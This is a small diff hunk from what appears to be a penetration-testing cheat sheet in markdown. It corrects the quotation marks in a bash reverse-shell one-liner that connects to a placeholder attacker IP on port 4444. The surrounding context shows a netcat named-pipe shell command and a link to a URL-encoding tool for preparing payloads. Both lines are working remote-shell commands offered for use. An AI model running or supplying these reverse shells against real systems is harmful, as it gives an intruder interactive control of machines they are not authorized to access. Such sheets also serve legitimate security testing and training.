@@ -37,7 +37,7 @@ cat /tmp/f | /bin/sh -i 2>&1 | nc -nl 127.0.0.1 4444 > /tmp/f
 
 ### Simple Reverse Shell Linux:
 ```bash
-bash -c “bash -i >& /dev/tcp/<OurIP>/4444 0>&1”
+bash -c "bash -i >& /dev/tcp/<OurIP>/4444 0>&1"
 ```
 When you inevitably need to URL encode (https://meyerweb.com/eric/tools/dencoder/):
 ```bash
